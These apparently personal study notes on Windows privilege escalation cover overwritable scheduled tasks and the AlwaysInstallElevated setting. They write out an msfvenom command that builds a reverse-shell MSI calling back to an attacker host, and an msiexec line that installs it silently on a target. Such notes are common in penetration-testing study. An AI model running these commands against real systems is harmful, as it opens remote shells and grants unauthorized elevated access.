Notes about privilege escalation on [[Windows]].

## Scheduled tasks

[[Windows/Enumeration#Scheduled Tasks]]

Check scheduled tasks. Can you overwrite the file being ran?

## AlwaysInstallElevated

[[Windows/Enumeration#AlwaysInstallElevated]]

Check if `AlwaysInstallElevated` is enabled.

Generate a malicious `.msi` on attacking computer, e.g. using `msvenom`:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

Transfer the malicious `.msi`.

Execute on the target computer:

```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

## Related

- [[Windows]]
- [[Windows/Enumeration]]